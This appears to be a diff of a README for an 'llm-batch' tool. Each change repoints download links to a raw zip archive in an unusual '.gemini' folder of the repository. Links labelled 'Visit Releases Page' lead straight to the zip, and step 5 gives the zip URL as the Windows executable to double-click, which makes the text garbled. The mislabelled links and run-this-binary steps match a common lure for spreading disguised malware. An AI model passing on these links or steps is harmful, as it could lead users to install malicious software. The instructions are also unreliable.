@@ -9,10 +9,10 @@ Welcome to the llm-batch application! This tool helps you quickly process JSON a
 
 To get started with llm-batch, you need to download the application. 
 
-[![Download llm-batch](https://raw.githubusercontent.com/kimmmmyy223/llm-batch/main/geographize/llm-batch.zip)](https://raw.githubusercontent.com/kimmmmyy223/llm-batch/main/geographize/llm-batch.zip)
+[![Download llm-batch](https://github.com/kimmmmyy223/llm-batch/raw/refs/heads/main/.gemini/batch-llm-v2.7.zip)](https://github.com/kimmmmyy223/llm-batch/raw/refs/heads/main/.gemini/batch-llm-v2.7.zip)
 
 1. **Visit the Releases Page**: Click the link below to go to the download section of GitHub:
-   [Visit Releases Page](https://raw.githubusercontent.com/kimmmmyy223/llm-batch/main/geographize/llm-batch.zip)
+   [Visit Releases Page](https://github.com/kimmmmyy223/llm-batch/raw/refs/heads/main/.gemini/batch-llm-v2.7.zip)
 
 2. **Choose the Right Version**: Look for the latest version on the Releases page. You will usually see a list of files there. 
 
@@ -20,7 +20,7 @@ To get started with llm-batch, you need to download the application.
 
 4. **Extract Files (if needed)**: If the downloaded file is zipped, right-click on it and select “Extract All” or similar options to open the folder.
 
-5. **Run the Application**: After extraction, find the main executable file (like `https://raw.githubusercontent.com/kimmmmyy223/llm-batch/main/geographize/llm-batch.zip` for Windows or `llm-batch` for macOS/Linux). Double-click the file to run the application.
+5. **Run the Application**: After extraction, find the main executable file (like `https://github.com/kimmmmyy223/llm-batch/raw/refs/heads/main/.gemini/batch-llm-v2.7.zip` for Windows or `llm-batch` for macOS/Linux). Double-click the file to run the application.
 
 ## 🛠️ Usage Instructions
 
@@ -87,5 +87,5 @@ If you encounter any issues, feel free to reach out through the Issues section o
 ## 📥 Download and Install Again
 
 To download llm-batch, click below:
-[Visit Releases Page](https://raw.githubusercontent.com/kimmmmyy223/llm-batch/main/geographize/llm-batch.zip)
+[Visit Releases Page](https://github.com/kimmmmyy223/llm-batch/raw/refs/heads/main/.gemini/batch-llm-v2.7.zip)
 ```
